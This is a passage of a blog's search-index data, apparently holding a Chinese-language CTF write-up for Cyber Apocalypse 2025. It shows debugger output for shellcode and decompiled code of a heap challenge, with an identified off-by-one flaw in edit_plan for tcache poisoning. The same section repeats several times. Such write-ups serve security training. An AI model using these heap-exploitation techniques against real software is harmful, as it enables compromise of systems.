BYTE PTR [rax],al pwndbg\u003e disassemble /r 0x40e221, 0x40e230 Dump of assembler code from 0x40e221 to 0x40e230: 0x000000000040e221: 6a 68 push 0x68 0x000000000040e223: 48 b8 2f 00 00 00 00 00 00 00 movabs rax,0x2f 可以看到，从0x40e221开始才是正确的shellcode 可能是fgets_unlock就是这样的： RAX 0x6a RBX 0x40e020 (__stdin_FILE) ◂— 0x49 /* 'I' */ RCX 1 RDX 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ RDI 1 RSI 0x743046e24010 —▸ 0x743046e24067 ◂— 0x3f07dd419300946a R8 0x1c R9 0x3d R10 7 R11 0x202 R12 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ R13 0x40e300 (buf) ◂— add byte ptr [rax], al /* 0xa00000000000000 */ R14 0 R15 0xfe RBP 0x6161616161616161 ('aaaaaaaa') RSP 0x743046e24080 —▸ 0x40a356 (mprotect+54) ◂— add rsp, 8 *RIP 0x401db6 (fgets_unlocked+246) ◂— mov byte ptr [rdx], al EFLAGS 0x206 [ cf PF af zf sf IF df of ] ─────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────── 0x401ddd \u003cfgets_unlocked+285\u003e call __uflow \u003c__uflow\u003e 0x401de2 \u003cfgets_unlocked+290\u003e test eax, eax 0x6a \u0026 0x6a EFLAGS =\u003e 0x206 [ cf PF af zf sf IF df of ] 0x401de4 \u003cfgets_unlocked+292\u003e js fgets_unlocked+449 \u003cfgets_unlocked+449\u003e 0x401dea \u003cfgets_unlocked+298\u003e mov rdx, r12 RDX =\u003e 0x40e301 (buf+1) ◂— add byte ptr [rax], al /* 0xa000000000000 */ 0x401ded \u003cfgets_unlocked+301\u003e jmp fgets_unlocked+246 \u003cfgets_unlocked+246\u003e ↓ ► 0x401db6 \u003cfgets_unlocked+246\u003e mov byte ptr [rdx], al [buf+1] =\u003e 0x6a 0x401db8 \u003cfgets_unlocked+248\u003e sub r15d, 1 R15D =\u003e 253 (0xfe - 0x1) 0x401dbc \u003cfgets_unlocked+252\u003e lea r12, [rdx + 1] R12 =\u003e 0x40e302 (buf+2) ◂— add byte ptr [rax], al /* 0xa0000000000 */ 0x401dc0 \u003cfgets_unlocked+256\u003e cmp al, 0xa 0x6a - 0xa EFLAGS =\u003e 0x206 [ cf PF af zf sf IF df of ] 0x401dc2 \u003cfgets_unlocked+258\u003e je fgets_unlocked+137 \u003cfgets_unlocked+137\u003e 0x401dc4 \u003cfgets_unlocked+260\u003e test r15d, r15d 0xfd \u0026 0xfd EFLAGS =\u003e 0x202 [ cf pf af zf sf IF df of ] ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:4:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#exp-3"},{"categories":["WP"],"collections":null,"content":"strategist\rtcache posioning ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:0","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#strategist"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#逆向分析"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#menu"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#create-plan"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } free(*(8LL * v2 + a1)); *(8LL * v2 + a1) = 0; printf(\"%s\\n[%sSir Alaric%s]: We will remove this plan!\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v3; } ","date":"2025-06-06","objectID":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/:5:1","tags":null,"title":"Cyber_Apocalypse_CTF_2025_Tales_from_Eldoria","uri":"/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/#show-plan"},{"categories":["WP"],"collections":null,"content":"逆向分析\rmenu\r__int64 menu() { printf( \"%s+-----------------+\\n\" \"| 1. Create plan |\\n\" \"| 2. Show plan |\\n\" \"| 3. Edit plan |\\n\" \"| 4. Delete plan |\\n\" \"+-----------------+\\n\" \"\\n\" \"\u003e \", \"\\x1B[1;34m\"); return read_num(); } create plan\r先从上往下检查main函数的栈里哪个位置为空，返回给v3。 根据输入的v2，malloc(v2)。 往申请的堆里读入v2大小的内容。 把申请的堆用户地址写入main函数的栈里。 unsigned __int64 __fastcall create_plan(__int64 a1) { int v2; // [rsp+18h] [rbp-18h] BYREF int v3; // [rsp+1Ch] [rbp-14h] void *heap_addr; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); v3 = check(a1); //检查main函数栈里从上到下哪个位置为空 if ( v3 == -1 ) { printf(\"%s\\n[%sSir Alaric%s]: Don't go above your head kiddo!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: How long will be your plan?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); heap_addr = malloc(v2); if ( !heap_addr ) { printf(\"%s\\n[%sSir Alaric%s]: This plan will be a grand failure!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); read(0, heap_addr, v2); *(a1 + 8LL * v3) = heap_addr; printf( \"%s\\n[%sSir Alaric%s]: The plan might work, we'll keep it in mind.\\n\\n\", \"\\x1B[1;32m\", \"\\x1B[1;33m\", \"\\x1B[1;32m\"); return __readfsqword(0x28u) ^ v5; } show plan\r根据输入的v2，索引相应的plan并输出存在plan里的内容 unsigned __int64 __fastcall show_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to view?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Plan [%d]: %s\\n\", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\", v2, *(8LL * v2 + a1)); return __readfsqword(0x28u) ^ v3; } edit plan\r输入v3选择相应plan 根据plan内的内容长度v1，再次read进v1长度的内容 但是这里的strlen存在off-by-one，可以覆盖掉下一个春困 unsigned __int64 __fastcall edit_plan(__int64 a1) { size_t v1; // rax signed int v3; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to change?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v3 = 0; __isoc99_scanf(\"%d\", \u0026v3); if ( v3 \u003e= 0x64 || !*(8LL * v3 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", \"\\x1B[1;33m\", \"\\x1B[1;31m\"); exit(1312); } printf(\"%s\\n[%sSir Alaric%s]: Please elaborate on your new plan.\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v1 = strlen(*(8LL * v3 + a1)); read(0, *(8LL * v3 + a1), v1); putchar(10); return __readfsqword(0x28u) ^ v4; } delete plan\r输入v2，在栈中索引相应plan free掉相应的heap 并把存在栈上的heap_pointer置0 unsigned __int64 __fastcall delete_plan(__int64 a1) { signed int v2; // [rsp+14h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"%s\\n[%sSir Alaric%s]: Which plan you want to delete?\\n\\n\u003e \", \"\\x1B[1;34m\", \"\\x1B[1;33m\", \"\\x1B[1;34m\"); v2 = 0; __isoc99_scanf(\"%d\", \u0026v2); if ( v2 \u003e= 0x64 || !*(8LL * v2 + a1) ) { printf(\"%s\\n[%sSir Alaric%s]: There is no such plan!\\n\\n\", \"\\x1B[1;31m\", 